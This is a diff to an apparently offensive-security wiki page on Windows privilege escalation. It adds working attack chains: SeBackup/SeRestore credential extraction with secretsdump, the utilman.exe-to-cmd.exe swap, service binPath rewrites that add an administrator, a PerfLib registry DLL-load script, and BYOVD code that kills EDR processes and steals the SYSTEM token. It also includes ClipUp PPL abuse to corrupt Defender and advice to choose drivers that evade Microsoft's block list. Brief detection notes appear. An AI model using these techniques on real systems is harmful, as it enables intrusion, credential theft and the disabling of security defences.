@@ -4,8 +4,8 @@ type: technique
 tags: [privilege-escalation, reference-import, windows]
 phase: post-exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
-sources: [InternalAllTheThings]
+date_updated: 2026-07-14
+sources: [InternalAllTheThings, hacktricks-windows]
 ---
 
 # Windows - Privilege Escalation
@@ -1545,6 +1545,281 @@ Failing on :
 * 1803
 
 Detailed information about the vulnerability : [Thanksgiving Treat: Easy-as-Pie Windows 7 Secure Desktop Escalation of Privilege - Simon Zuckerbraun - November 19, 2019](https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege)
+
+## SeManageVolumePrivilege: raw volume read that bypasses NTFS ACLs
+
+The "Perform volume maintenance tasks" right lets a holder open a raw volume
+device handle (`\\.\C:`) and issue direct block I/O that ignores NTFS file DACLs.
+With raw access you copy the bytes of any file on the volume, even those denied to
+you, by parsing NTFS offline or using an NTFS-aware tool. Default holders are
+Administrators on servers and DCs, but it is frequently over-delegated to service
+or operator accounts, which is where it becomes a privesc.
+
+```powershell
+# Read raw bytes from C: (requires SeManageVolumePrivilege), then carve offline
+$fs = [System.IO.File]::Open("\\.\C:",'Open','Read','ReadWrite')
+$buf = New-Object byte[] (1MB)
+$null = $fs.Read($buf,0,$buf.Length)
+$fs.Close()
+[IO.File]::WriteAllBytes("C:\temp\c_first_mb.bin",$buf)
+```
+
+Prefer an NTFS-aware helper (RawCopy/RawCopy64 for sector-level copy of in-use
+files, or FTK Imager / Sleuth Kit for read-only imaging then carve). High-value
+targets to read past their ACLs:
+
+```text
+%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\   # machine private keys
+%ProgramData%\Microsoft\Crypto\Keys\
+C:\Windows\System32\config\SAM, SYSTEM, SECURITY   # local secrets
+C:\Windows\NTDS\ntds.dit                           # DC, via shadow copy
+```
+
+AD CS tie-in: reading the Enterprise CA private key from the machine key store
+lets you forge client-auth certificates for any principal and authenticate via
+PKINIT/Schannel (a Golden Certificate). Detection: monitor sensitive-privilege use
+and handle opens to `\\.\C:` / `\\.\PhysicalDrive0`.
+
+## SeLoadDriverPrivilege: load a signed vulnerable driver without admin
+
+Holders (notably Print Operators, which get `SeLoadDriverPrivilege` via the
+default DC policy) can load a kernel driver. The privilege is often hidden under a
+non-elevated token, so enable it first, then register a driver whose `ImagePath`
+lives under an HKCU key you control (the classic EoPLoadDriver / NtLoadDriver
+route), point it at a signed-but-vulnerable driver, and use the driver's IOCTLs to
+gain kernel R/W or elevate to SYSTEM.
+
+```text
+1. Enable SeLoadDriverPrivilege in the current token (EoPLoadDriver / manual token
+   adjust; on a DC the Print Operators member may need a UAC-elevated token first).
+2. Create HKCU\System\CurrentControlSet\Services\<name> with ImagePath ->
+   \??\C:\path\Capcom.sys  and Type = 1 (kernel driver).
+3. Call NtLoadDriver("\Registry\User\<SID>\System\CurrentControlSet\Services\<name>").
+4. Open \\.\<DeviceName> and issue the driver's IOCTL to run kernel shellcode.
+```
+
+The privilege also unloads security drivers via the built-in filter manager
+(`fltMC unload <driver>`), for example unloading a Sysmon or minifilter component.
+Note that old public drivers (`szkg64.sys`, `Capcom.sys`) are increasingly caught
+by the Microsoft vulnerable-driver block list and HVCI on modern builds, so pick a
+driver not on the block list. This overlaps BYOVD but is reachable from a
+non-admin holder of the privilege, which is the distinction.
+
+## SeBackup, SeRestore, and SeTakeOwnership privilege abuse
+
+Three read/write-anything privileges that convert a service or operator account
+into SYSTEM without an exploit. The wiki covers shadow-copy NTDS extraction; the
+delta is the privilege-specific chains.
+
+SeBackup (read any file via `FILE_FLAG_BACKUP_SEMANTICS`): copy locked/denied
+files, then extract secrets offline.
+
+```cmd
+robocopy /b C:\Windows\NTDS C:\temp\ntds ntds.dit
+reg save HKLM\SYSTEM C:\temp\SYSTEM.SAV
+reg save HKLM\SAM    C:\temp\SAM.SAV
+:: On a DC, snapshot first with diskshadow, then robocopy /b ntds.dit from the shadow
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+SeRestore (write/own any file): grant yourself write to a protected path, then
+swap a binary that runs as SYSTEM. Classic accessibility-swap:
+
+```text
+1. Enable SeRestorePrivilege (Enable-SeRestorePrivilege).
+2. Rename C:\Windows\System32\utilman.exe -> utilman.old
+3. Copy cmd.exe -> C:\Windows\System32\utilman.exe
+4. Lock the console (Win+L) and press Win+U -> SYSTEM cmd on the logon screen.
+   (Alternatively replace a service binary under Program Files and restart it.)
+```
+
+SeTakeOwnership (`WRITE_OWNER` on any object): take ownership of a target file or
+registry key, rewrite its DACL to grant yourself full control, then replace it.
+
+```cmd
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant "%username%":F
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+:: same utilman/Win+U trigger, or take ownership of a SYSTEM-run service binary
+```
+
+All three are noisy and may trip AV on the utilman swap, so the service-binary
+replacement variant is often cleaner. These are also the Backup Operators / Server
+Operators privesc route on a DC.
+
+## SeCreateTokenPrivilege and SeTcbPrivilege: forge an admin token
+
+SeCreateToken lets a process build an arbitrary access token with `NtCreateToken`,
+including one that carries the local Administrators SID and full privileges, then
+impersonate it. It is useful for elevation even without SeImpersonatePrivilege,
+provided you can impersonate a token for the same user whose integrity level does
+not exceed the current process. SeTcb ("act as part of the OS") similarly allows
+assembling a token with added group memberships/privileges and is often paired
+with SeImpersonate.
+
+```text
+Abuse outline (3rd-party tooling, e.g. the PrivFu family):
+1. Build a TOKEN_GROUPS containing S-1-5-32-544 (Administrators), enabled.
+2. Build TOKEN_PRIVILEGES with the privileges you want (SeDebug, SeImpersonate...).
+3. NtCreateToken(TokenImpersonation, ..., groups, privileges, ...).
+4. ImpersonateLoggedOnUser / SetThreadToken, or DuplicateTokenEx to a primary
+   token and CreateProcessAsUser -> SYSTEM/admin process.
+```
+
+These are rare in the wild but are an instant win when found on a service account,
+so both belong in a privilege-triage checklist alongside SeImpersonate/SeDebug.
+
+## Named-pipe client impersonation primitive and pipe ACL MITM
+
+The wiki lists the Potato chains but not the underlying primitive or the pipe-ACL
+attacks. With SeImpersonatePrivilege you host a named pipe, coerce a privileged
+client (a SYSTEM service) to connect, read one message, then impersonate it and
+spawn a process as that client. This is the engine every Potato drives.
+
+```text
+1. CreateNamedPipe(\\.\pipe\<random>), ConnectNamedPipe.
+2. Coerce a SYSTEM client to connect (spooler RPC, DCOM activation/NTLM reflection,
+   EFSRPC). ReadFile at least one message (else ImpersonateNamedPipeClient returns
+   ERROR_CANNOT_IMPERSONATE 1368).
+3. ImpersonateNamedPipeClient; OpenThreadToken; DuplicateTokenEx(TokenPrimary).
+4. CreateProcessWithTokenW (needs SeImpersonate) or CreateProcessAsUser -> SYSTEM.
+```
+
+The impersonation only works if the client allowed `SecurityImpersonation`; a
+client that opens the pipe with `SECURITY_IDENTIFICATION` limits you to an
+identification token you cannot use for process creation. Enumerate live pipes
+first (`Get-ChildItem \\.\pipe\` or Sysinternals pipelist64) and prioritize
+SYSTEM helpers, updaters, and UI brokers.
+
+Beyond server-side impersonation, treat a privileged pipe as untrusted IPC:
+
+- Permissive DACL MITM: if the DACL grants `FILE_GENERIC_WRITE` (which implies
+  `FILE_CREATE_PIPE_INSTANCE`), create a rogue instance with the same name; FIFO
+  matching lets a real client land on your instance so you observe, modify, or
+  relay privileged IPC.
+- First-instance security-descriptor race: `lpSecurityAttributes` sets the DACL
+  only on the first instance. If a service does not use
+  `FILE_FLAG_FIRST_PIPE_INSTANCE`, pre-create the pipe name with a permissive DACL
+  before the service starts, then MITM its later instances.
+- PID/signature client checks are hardening, not a boundary: inject into the
+  trusted client and you inherit the exact PID/image/signer the server expects.
+
+Tooling: pipetap and thats_no_pipe proxy/hook pipe traffic for editing and replay.
+
+## ACL-based service, registry, and scheduled-task abuse (beyond weak binPath)
+
+The wiki has the weak-service-DACL binPath rewrite. The delta is the ACL edge
+cases that triage tools miss.
+
+WRITE_DAC / WRITE_OWNER on a service: even without direct `CHANGE_CONFIG`, you can
+rewrite the service DACL to grant yourself config rights, then repoint `binPath`.
+
+```cmd
+accesschk.exe -uwcqv "Authenticated Users" *          :: services you can modify
+sc config <svc> binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators user /add"
+sc start <svc>
+```
+
+Performance-key registry DLL load (the "CreateSubKey is enough" primitive). If you
+only have `KEY_CREATE_SUB_KEY` / `AppendData/AddSubdirectory` on a service key (so
+you cannot touch `ImagePath` or `ServiceDll`), you can still create a legacy
+PerfLib `Performance` subkey; a privileged performance-counter consumer (a WMI
+`Win32_Perf*` query handled by `wmiprvse.exe` running as SYSTEM) then loads your
+DLL. This was the RpcEptMapper/Dnscache route on older builds and returned in
+CVE-2025-21293 (Network Configuration Operators over Dnscache/NetBT).
+
+```powershell
+$svc = 'Dnscache'   # or RpcEptMapper / NetBT, wherever you hold CreateSubKey
+$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
+New-Item $k -Force | Out-Null
+New-ItemProperty $k Library "$pwd\payload.dll" -PropertyType String -Force | Out-Null
+New-ItemProperty $k Open    'OpenPerfData'    -PropertyType String -Force | Out-Null
+New-ItemProperty $k Collect 'CollectPerfData' -PropertyType String -Force | Out-Null
+New-ItemProperty $k Close   'ClosePerfData'   -PropertyType String -Force | Out-Null
+# Trigger a privileged consumer (not perfmon, which loads it only in your context):
+powershell -NoProfile -c "Get-WmiObject -List | ? { $_.Name -like 'Win32_Perf*' } | Out-Null"
+```
+
+Enumerate with `accesschk.exe -k -w hklm\system\currentcontrolset\services\<svc>`,
+PrivescCheck `Get-ModifiableRegistryPath`, or SharpUp
+`audit ModifiableServiceRegistryKeys`; Perfusion automates the full DLL-drop and
+token-duplication chain. The DLL must export the three PerfData functions and match
+the consumer architecture. Also check writable scheduled-task XML/action paths and
+writable HKLM `...\CurrentVersion\Run` autorun entries for the same class of bug.
+
+## BYOVD: kill AV/EDR from the kernel and steal a SYSTEM token
+
+Bring Your Own Vulnerable Driver: as admin, install a legitimately signed but
+vulnerable driver as a kernel service so it loads even with Driver Signature
+Enforcement on, then drive its IOCTLs to do what user-mode protections forbid.
+Kernel code can open PPL/PP processes, so this defeats LSA Protection, PPL AV, and
+ELAM.
+
+```powershell
+sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
+sc start  ServiceMouse
+# \\.\ServiceMouse now reachable; the driver here exposes:
+#   IOCTL 0x99000050 terminate a PID (kill Defender/EDR)
+#   IOCTL 0x990000D0 delete an arbitrary file
+#   IOCTL 0x990001D0 unload the driver + remove the service
+```
+
+```c
+HANDLE h = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE,0,0,OPEN_EXISTING,0,0);
+DWORD pid = target_edr_pid;
+DeviceIoControl(h, 0x99000050, &pid, sizeof(pid), 0,0,0,0);   // terminate protected process
+```
+
+Arbitrary kernel R/W to SYSTEM (token steal): if the driver exposes 8-byte kernel
+read and write IOCTLs, elevate by copying the SYSTEM process token pointer into your
+own EPROCESS. Read `PsInitialSystemProcess`, walk `ActiveProcessLinks` to find both
+SYSTEM (PID 4) and your own EPROCESS, then splice the token.
+
+```text
+Token_SYS = *(EPROCESS_SYSTEM + TokenOffset)          # EX_FAST_REF, mask low 3 bits
+Token_NEW = (Token_SYS & ~0xF) | (Token_ME & 0x7)     # preserve your ref-count bits
+write Token_NEW -> (EPROCESS_SELF + TokenOffset)       # current process is now SYSTEM
+```
+
+EPROCESS offsets vary by build, resolve them from symbols or version constants.
+Detection/mitigation: enable the Microsoft vulnerable-driver block list, HVCI, and
+Smart App Control; alert on new kernel services and driver loads from world-writable
+paths, and on user-mode handles to custom device objects followed by DeviceIoControl.
+
+## PPL abuse: tamper AV/EDR with a signed LOLBIN write primitive
+
+A no-BYOVD way to attack a Protected-Process-Light AV from admin/SYSTEM. PPL only
+lets equal-or-higher protected processes touch each other, but if you legitimately
+launch a PPL-capable signed binary and control its arguments, you can turn benign
+functionality into a PPL-backed write into a protected AV directory.
+
+`ClipUp.exe` is the LOLBIN: the signed system binary self-spawns and writes a log
+file to a caller-specified path, so when launched as a protected process the write
+carries PPL backing. Launch it with `EXTENDED_STARTUPINFO_PRESENT |
+CREATE_PROTECTED_PROCESS` at the matching signer level (a helper such as
+CreateProcessAsPPL selects the level and forwards args).
+
+```text
+# Windows-signer level (1); ClipUp cannot parse spaces, so use 8.3 short paths
+CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
+# derive short names:
+for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA
+```
+
+Because the target AV binary is locked while running, schedule the write at boot
+via an auto-start service that runs before the AV, so the PPL-backed write corrupts
+the file before it is locked and the AV fails to start on reboot. The primitive
+controls placement, not content, so it suits corruption/denial rather than precise
+injection. Requires local admin/SYSTEM plus a reboot window. Detection: ClipUp with
+unusual args parented by non-standard launchers around boot, and new services that
+consistently start before Defender.
+
+## COM hijacking
+
+COM CLSID hijacking via HKCU (InprocServer32, TreatAs, TypeLib, and Task Scheduler
+COM triggers) is both a local privilege escalation and a persistence primitive when
+a privileged or high-frequency process resolves a class from a user-writable key.
+Full technique: [[windows-com-hijacking]].
 
 ## References
 
